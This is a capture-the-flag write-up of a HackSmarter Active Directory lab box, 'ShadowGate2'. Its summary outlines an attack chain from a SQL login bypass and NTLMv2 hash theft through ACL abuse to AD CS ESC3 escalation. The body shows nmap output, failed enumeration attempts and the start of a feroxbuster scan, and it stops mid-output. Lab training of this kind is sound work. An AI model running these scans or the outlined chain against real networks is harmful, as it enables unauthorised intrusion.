---
title: HackSmarter - ShadowGate2
date: 2026-07-16
image: cover.png
tags: [HackSmarter, Medium, Windows, Active Directory]
excerpt: A medium Active Directory box that uncovers a hidden dev subdomain, bypasses its SQL login to plant NTLMv2-theft files and crack a reviewer's hash, walks a chain of ForceChangePassword, WriteOwner and GenericAll edges through MSSQL impersonation and a logonHours bypass, revives a deleted account from the AD Recycle Bin, and abuses AD CS ESC3 to authenticate as Administrator.
---

# ShadowGate2

ShadowGate provides cybersecurity solutions for global enterprises. They are in the process of getting SOC 2 certified, and have hired Hack Smarter to perform an internal network penetration test. Find all vulnerabilities and, if possible, elevate your privileges to Domain Admin.

### NMAP Scanning

```c
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: ShadowGate | Advanced Cyber Security Solutions
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-07-16 14:11:07Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadowgate.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SG-DC01.shadowgate.local
| Issuer: commonName=Shadowgate-CA/domainComponent=shadowgate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-07T17:46:45
| Not valid after:  2026-12-07T17:46:45
| MD5:   016f:ca06:03dd:b832:2cce:8260:67b9:a567
| SHA-1: 040e:a191:a804:b2b2:7248:1ca6:06a5:87fa:c32d:2b8a
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITMQAAAALh38y96SpvyAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBLMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAYBgoJkiaJk/IsZAEZFgpzaGFk
| b3dnYXRlMRYwFAYDVQQDEw1TaGFkb3dnYXRlLUNBMB4XDTI1MTIwNzE3NDY0NVoX
| DTI2MTIwNzE3NDY0NVowIzEhMB8GA1UEAxMYU0ctREMwMS5zaGFkb3dnYXRlLmxv
| Y2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8RR93U1V53WqyzsP
| tedIlXEDbNldvdmDY83VqJVoJ+4z1zYk45pTkMpf/va2lMDUAgzTYphBVM0+Qc6r
| YHpF8u/2Aqx3KppNwFu46ZdJ/mcyDS7ot3fssagBsLmzex3iRCJEuaOOX4fkAsBQ
| ynlV1LF2lEArnKQBElDdVqhuRNTh4wANc+cybNLIH9X4/d0CPE6l6dp0W2zwain0
| aNoymQlzh7UCMKr7O/0WdUL/KGPQ+sZes/GiY8qVWHO9yxB4003YoBQQ1Ois7UoN
| hRq+V7QUlJtj5m4nC0o/mF8i/GTJ1VUckClYXLOtrJ9MRiX9OwIpB+mCRsSQRmc5
| c82QzQIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQUuKin5sxS2XGwDMGqsHjqKLuOruwwHwYDVR0jBBgwFoAUoCGcMeLEJajk
| IxIy8ecnyuUYJQUwgdAGA1UdHwSByDCBxTCBwqCBv6CBvIaBuWxkYXA6Ly8vQ049
| U2hhZG93Z2F0ZS1DQSxDTj1TRy1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNoYWRv
| d2dhdGUsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29i
| amVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHEBggrBgEFBQcBAQSBtzCB
| tDCBsQYIKwYBBQUHMAKGgaRsZGFwOi8vL0NOPVNoYWRvd2dhdGUtQ0EsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9c2hhZG93Z2F0ZSxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBEBgNVHREEPTA7
| oB8GCSsGAQQBgjcZAaASBBC3jhe/gG2xTICXUQZFddu3ghhTRy1EQzAxLnNoYWRv
| d2dhdGUubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
| MS01LTIxLTIzOTY0MzY1NzYtMzI2NzEyODM3Ny0zNjQ2MzcyMzYwLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIJVHd0RnovwebW/NhF6/hU2GRZtiXr6UFveU75mETAt
| HzKetn4K96Wsleb8m47KebeC1RQQgzpN0kwQKDQu27wGBiPVL/dW3D7umiz1uLXR
| zAjDNTDJHXWBiQkKDp0FdUqb5qvNXe1u7ersv0aC+Q4gjQifA4QbFHiz7B/oKDX9
| YbIeFacckFlVNcto4jsSW/rYSegvnduT+nhScOBKNylFeDwhynYlku44R3FT1y7s
| LWoHMD9hHuAd74vklO3MTZ4QnQmt5ETnNy7kJ5FyWsXWEIcNeJjOdaUaYaWRgptx
| yVJb5My9faKnHTD7mlzc1W2inI7+rXZBPbcx+0fz8Ik=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-07-16T14:12:43+00:00; -1s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
1433/tcp  open  ms-sql-s      syn-ack ttl 126 Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2026-07-16T14:12:43+00:00; -1s from scanner time.
| ms-sql-info:
|   10.1.106.153:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info:
|   10.1.106.153:1433:
|     Target_Name: SHADOWGATE
|     NetBIOS_Domain_Name: SHADOWGATE
|     NetBIOS_Computer_Name: SG-DC01
|     DNS_Domain_Name: shadowgate.local
|     DNS_Computer_Name: SG-DC01.shadowgate.local
|     DNS_Tree_Name: shadowgate.local
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-16T14:07:20
| Not valid after:  2056-07-16T14:07:20
| MD5:   037e:3981:a98d:b4af:cf59:41b2:b137:1728
| SHA-1: 214b:61f0:7ed9:73f0:6b4a:315e:4137:4d0a:d3cc:42a8
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQdiVurIVek6ZPgury4ccxSTANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjYwNzE2MTQwNzIwWhgPMjA1NjA3MTYxNDA3MjBaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKuLBYVs
| 884v76yLdaw4j6RJa17B7E+jydlACfnWMeMImpWUOyLWsBgOc7R5TVCaouQKmOmC
| 2qWTdHfzLp77Z/tf8g7Tuepy+XIZSZPnUSnwRI33tGf+JgZG6/t/Ta9FUnEUIzRB
| GhfdVkIiZMUcUkrUP1dHDknV93vy9L8c100F1i3OzDxOVLp3D6SOzK6VDZfbhFOW
| Y8h0K8exJOIrlDTMNTemR4BVe1QxC5X8+XHwQvdv4zEvq3Wyu+fepMwBOnB5krsb
| hP5zMfBP9EMJS8ddnPTZXILrkugBkXkyli1aQlmAKlHjXSvPCTzgqAx3ZuwA/7r6
| G13fIhIRgYV/8gkCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAVcHxBIx3L4lz23d6
| kf9/OVYfN6KGyW3tac6dz8PtHYHYwSb2rHu5fE3kL/rLl+GhNgQllXm8rZmg2gnO
| frGrqL2Rebz3M2JX7DGF5xt1Txl3poM3WjSJsTIDwoO/dr/ipxNhIyCx3N4NPSEZ
| gJNoiZ+MvAnP0O8XFCsnnI9JUlZu2R3nXx4rUYXnuczx0HKEW5ALGiqAsxA5If6I
| JjeoUYq4vk6K+EvpIl7NOBdiAOUa3+Z7q9DEN+pgRG6rwSx8Ox0d+g6gEcbxbNSh
| FPsJHVvscZcZoR+nudQoVDK7jL4aSxTnFYG6U1HhCzm7yJQCNz6CD/he7/MMqRX6
| KoFBGA==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadowgate.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SG-DC01.shadowgate.local
| Issuer: commonName=Shadowgate-CA/domainComponent=shadowgate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-07T17:46:45
| Not valid after:  2026-12-07T17:46:45
| MD5:   016f:ca06:03dd:b832:2cce:8260:67b9:a567
| SHA-1: 040e:a191:a804:b2b2:7248:1ca6:06a5:87fa:c32d:2b8a
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITMQAAAALh38y96SpvyAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBLMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAYBgoJkiaJk/IsZAEZFgpzaGFk
| b3dnYXRlMRYwFAYDVQQDEw1TaGFkb3dnYXRlLUNBMB4XDTI1MTIwNzE3NDY0NVoX
| DTI2MTIwNzE3NDY0NVowIzEhMB8GA1UEAxMYU0ctREMwMS5zaGFkb3dnYXRlLmxv
| Y2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8RR93U1V53WqyzsP
| tedIlXEDbNldvdmDY83VqJVoJ+4z1zYk45pTkMpf/va2lMDUAgzTYphBVM0+Qc6r
| YHpF8u/2Aqx3KppNwFu46ZdJ/mcyDS7ot3fssagBsLmzex3iRCJEuaOOX4fkAsBQ
| ynlV1LF2lEArnKQBElDdVqhuRNTh4wANc+cybNLIH9X4/d0CPE6l6dp0W2zwain0
| aNoymQlzh7UCMKr7O/0WdUL/KGPQ+sZes/GiY8qVWHO9yxB4003YoBQQ1Ois7UoN
| hRq+V7QUlJtj5m4nC0o/mF8i/GTJ1VUckClYXLOtrJ9MRiX9OwIpB+mCRsSQRmc5
| c82QzQIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQUuKin5sxS2XGwDMGqsHjqKLuOruwwHwYDVR0jBBgwFoAUoCGcMeLEJajk
| IxIy8ecnyuUYJQUwgdAGA1UdHwSByDCBxTCBwqCBv6CBvIaBuWxkYXA6Ly8vQ049
| U2hhZG93Z2F0ZS1DQSxDTj1TRy1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNoYWRv
| d2dhdGUsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29i
| amVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHEBggrBgEFBQcBAQSBtzCB
| tDCBsQYIKwYBBQUHMAKGgaRsZGFwOi8vL0NOPVNoYWRvd2dhdGUtQ0EsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9c2hhZG93Z2F0ZSxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBEBgNVHREEPTA7
| oB8GCSsGAQQBgjcZAaASBBC3jhe/gG2xTICXUQZFddu3ghhTRy1EQzAxLnNoYWRv
| d2dhdGUubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
| MS01LTIxLTIzOTY0MzY1NzYtMzI2NzEyODM3Ny0zNjQ2MzcyMzYwLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIJVHd0RnovwebW/NhF6/hU2GRZtiXr6UFveU75mETAt
| HzKetn4K96Wsleb8m47KebeC1RQQgzpN0kwQKDQu27wGBiPVL/dW3D7umiz1uLXR
| zAjDNTDJHXWBiQkKDp0FdUqb5qvNXe1u7ersv0aC+Q4gjQifA4QbFHiz7B/oKDX9
| YbIeFacckFlVNcto4jsSW/rYSegvnduT+nhScOBKNylFeDwhynYlku44R3FT1y7s
| LWoHMD9hHuAd74vklO3MTZ4QnQmt5ETnNy7kJ5FyWsXWEIcNeJjOdaUaYaWRgptx
| yVJb5My9faKnHTD7mlzc1W2inI7+rXZBPbcx+0fz8Ik=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-07-16T14:12:43+00:00; -1s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadowgate.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SG-DC01.shadowgate.local
| Issuer: commonName=Shadowgate-CA/domainComponent=shadowgate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-07T17:46:45
| Not valid after:  2026-12-07T17:46:45
| MD5:   016f:ca06:03dd:b832:2cce:8260:67b9:a567
| SHA-1: 040e:a191:a804:b2b2:7248:1ca6:06a5:87fa:c32d:2b8a
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITMQAAAALh38y96SpvyAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBLMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAYBgoJkiaJk/IsZAEZFgpzaGFk
| b3dnYXRlMRYwFAYDVQQDEw1TaGFkb3dnYXRlLUNBMB4XDTI1MTIwNzE3NDY0NVoX
| DTI2MTIwNzE3NDY0NVowIzEhMB8GA1UEAxMYU0ctREMwMS5zaGFkb3dnYXRlLmxv
| Y2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8RR93U1V53WqyzsP
| tedIlXEDbNldvdmDY83VqJVoJ+4z1zYk45pTkMpf/va2lMDUAgzTYphBVM0+Qc6r
| YHpF8u/2Aqx3KppNwFu46ZdJ/mcyDS7ot3fssagBsLmzex3iRCJEuaOOX4fkAsBQ
| ynlV1LF2lEArnKQBElDdVqhuRNTh4wANc+cybNLIH9X4/d0CPE6l6dp0W2zwain0
| aNoymQlzh7UCMKr7O/0WdUL/KGPQ+sZes/GiY8qVWHO9yxB4003YoBQQ1Ois7UoN
| hRq+V7QUlJtj5m4nC0o/mF8i/GTJ1VUckClYXLOtrJ9MRiX9OwIpB+mCRsSQRmc5
| c82QzQIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQUuKin5sxS2XGwDMGqsHjqKLuOruwwHwYDVR0jBBgwFoAUoCGcMeLEJajk
| IxIy8ecnyuUYJQUwgdAGA1UdHwSByDCBxTCBwqCBv6CBvIaBuWxkYXA6Ly8vQ049
| U2hhZG93Z2F0ZS1DQSxDTj1TRy1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNoYWRv
| d2dhdGUsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29i
| amVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHEBggrBgEFBQcBAQSBtzCB
| tDCBsQYIKwYBBQUHMAKGgaRsZGFwOi8vL0NOPVNoYWRvd2dhdGUtQ0EsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9c2hhZG93Z2F0ZSxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBEBgNVHREEPTA7
| oB8GCSsGAQQBgjcZAaASBBC3jhe/gG2xTICXUQZFddu3ghhTRy1EQzAxLnNoYWRv
| d2dhdGUubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
| MS01LTIxLTIzOTY0MzY1NzYtMzI2NzEyODM3Ny0zNjQ2MzcyMzYwLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIJVHd0RnovwebW/NhF6/hU2GRZtiXr6UFveU75mETAt
| HzKetn4K96Wsleb8m47KebeC1RQQgzpN0kwQKDQu27wGBiPVL/dW3D7umiz1uLXR
| zAjDNTDJHXWBiQkKDp0FdUqb5qvNXe1u7ersv0aC+Q4gjQifA4QbFHiz7B/oKDX9
| YbIeFacckFlVNcto4jsSW/rYSegvnduT+nhScOBKNylFeDwhynYlku44R3FT1y7s
| LWoHMD9hHuAd74vklO3MTZ4QnQmt5ETnNy7kJ5FyWsXWEIcNeJjOdaUaYaWRgptx
| yVJb5My9faKnHTD7mlzc1W2inI7+rXZBPbcx+0fz8Ik=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-07-16T14:12:43+00:00; -1s from scanner time.
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2026-07-16T14:12:43+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
| Issuer: commonName=SG-DC01.shadowgate.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-06T16:10:27
| Not valid after:  2027-01-05T16:10:27
| MD5:   52d5:4bdb:224e:f2f7:78d0:aa76:9923:ff21
| SHA-1: 3bf5:3dcc:aad1:04bc:63d3:6a14:383d:32b6:f1ae:ce88
| -----BEGIN CERTIFICATE-----
| MIIC9DCCAdygAwIBAgIQNG5iHImrf65BB1tu+Pkt+zANBgkqhkiG9w0BAQsFADAj
| MSEwHwYDVQQDExhTRy1EQzAxLnNoYWRvd2dhdGUubG9jYWwwHhcNMjYwNzA2MTYx
| MDI3WhcNMjcwMTA1MTYxMDI3WjAjMSEwHwYDVQQDExhTRy1EQzAxLnNoYWRvd2dh
| dGUubG9jYWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCVS6icRk9x
| jnHDADUPXYH9D+ZREfgVUjGbyW3PFrVHUqVoUdxw7Y4HIQ3z6fIntAzZT1XFCNim
| vLYdk9JbExhLhOyXD/ZEo1wWrCBG/O0TmykP4vvBBUzvdTztttRDyFgSZuFmyTwq
| PW2N9PjdLqLax5lmC4ZvIhu5y65MB/ZepoyH4wnWAvWhJVNZF0i7jhvY5EoiHVcE
| tvK5JV66RVqPH8rMDXo7YKqv3XEDvrefc8mj1X65Ij+MIk4pamBkMbcp1IEXLInp
| 049T3N6zz2CWXRbqIi9IrGfreuNCWPNzn82Q/Z0A7al125Xax2zd22Yt8O+SNEIP
| 4FsSyDP4IoqBAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQE
| AwIEMDANBgkqhkiG9w0BAQsFAAOCAQEABXvbJ157/1t/O8aXx/qwfnXbpG+KFd/D
| p/4RhxosTuzJHGUHYT3gPtEIK+VE/tsY2TKoAyqg5mILzSkwzJm+GRENWNqNz/8U
| crG8EQFxIOM2gvwshOiemVapQvxmrv6cPn1+ubkbnrfqV56/ndk1RdzXLDXBrU6M
| f+o1ehlhm8zc+Rn3jAdA0vufEmEH9fH9IrMonyH/7tsgKemqWzFhYdSd4AibKSVA
| ic6shj8swv+ak+43j+CBixUH0jGGLr1QDoqDS2KXhgoKZnk8wzfW49s3jI0s34f6
| P5NjJgi2Gc9lQpp562YaThaJJvIOPJvTJ/ARdXqxDiOL+d2B/qlFVA==
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: SHADOWGATE
|   NetBIOS_Domain_Name: SHADOWGATE
|   NetBIOS_Computer_Name: SG-DC01
|   DNS_Domain_Name: shadowgate.local
|   DNS_Computer_Name: SG-DC01.shadowgate.local
|   DNS_Tree_Name: shadowgate.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-16T14:12:04+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49683/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49715/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49738/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
54311/tcp open  ms-sql-s      syn-ack ttl 126 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.1.106.153:54311:
|     Target_Name: SHADOWGATE
|     NetBIOS_Domain_Name: SHADOWGATE
|     NetBIOS_Computer_Name: SG-DC01
|     DNS_Domain_Name: shadowgate.local
|     DNS_Computer_Name: SG-DC01.shadowgate.local
|     DNS_Tree_Name: shadowgate.local
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-16T14:07:20
| Not valid after:  2056-07-16T14:07:20
| MD5:   037e:3981:a98d:b4af:cf59:41b2:b137:1728
| SHA-1: 214b:61f0:7ed9:73f0:6b4a:315e:4137:4d0a:d3cc:42a8
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQdiVurIVek6ZPgury4ccxSTANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjYwNzE2MTQwNzIwWhgPMjA1NjA3MTYxNDA3MjBaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKuLBYVs
| 884v76yLdaw4j6RJa17B7E+jydlACfnWMeMImpWUOyLWsBgOc7R5TVCaouQKmOmC
| 2qWTdHfzLp77Z/tf8g7Tuepy+XIZSZPnUSnwRI33tGf+JgZG6/t/Ta9FUnEUIzRB
| GhfdVkIiZMUcUkrUP1dHDknV93vy9L8c100F1i3OzDxOVLp3D6SOzK6VDZfbhFOW
| Y8h0K8exJOIrlDTMNTemR4BVe1QxC5X8+XHwQvdv4zEvq3Wyu+fepMwBOnB5krsb
| hP5zMfBP9EMJS8ddnPTZXILrkugBkXkyli1aQlmAKlHjXSvPCTzgqAx3ZuwA/7r6
| G13fIhIRgYV/8gkCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAVcHxBIx3L4lz23d6
| kf9/OVYfN6KGyW3tac6dz8PtHYHYwSb2rHu5fE3kL/rLl+GhNgQllXm8rZmg2gnO
| frGrqL2Rebz3M2JX7DGF5xt1Txl3poM3WjSJsTIDwoO/dr/ipxNhIyCx3N4NPSEZ
| gJNoiZ+MvAnP0O8XFCsnnI9JUlZu2R3nXx4rUYXnuczx0HKEW5ALGiqAsxA5If6I
| JjeoUYq4vk6K+EvpIl7NOBdiAOUa3+Z7q9DEN+pgRG6rwSx8Ox0d+g6gEcbxbNSh
| FPsJHVvscZcZoR+nudQoVDK7jL4aSxTnFYG6U1HhCzm7yJQCNz6CD/he7/MMqRX6
| KoFBGA==
|_-----END CERTIFICATE-----
| ms-sql-info:
|   10.1.106.153:54311:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 54311
|_ssl-date: 2026-07-16T14:12:43+00:00; -1s from scanner time.
Service Info: Host: SG-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-16T14:12:05
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 53289/tcp): CLEAN (Timeout)
|   Check 2 (port 30131/tcp): CLEAN (Timeout)
|   Check 3 (port 64327/udp): CLEAN (Timeout)
|   Check 4 (port 56598/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```

### RPC Enumeration

RPC queries return `NT_STATUS_ACCESS_DENIED`, confirming that valid domain credentials are required before any enumeration succeeds.

{% image %}

### SMB Enumeration - Guest & NULL Authentication

{% image2 %}

Both Guest and NULL authentication are rejected. Before going further, the domain and hostname from the scan go into the `/etc/hosts` file:

```c
10.1.106.153	SG-DC01.shadowgate.local shadowgate.local
```

### LDAP Enumeration

Extracting the naming contexts first with `ldapsearch -x -H ldap://10.1.106.153 -s base namingcontexts`:

{% image3 %}

Any deeper LDAP query returns `successful bind must be completed on the connection.`, which confirms anonymous access is restricted and valid credentials are required.

### WebServer Enumeration

{% image4 %}

Running a Feroxbuster scan to surface endpoints that are not linked from the site:

```c
➜  shadowgate2 feroxbuster --url http://shadowgate.local/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://shadowgate.local/
 🚩  In-Scope Url          │ shadowgate.local
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
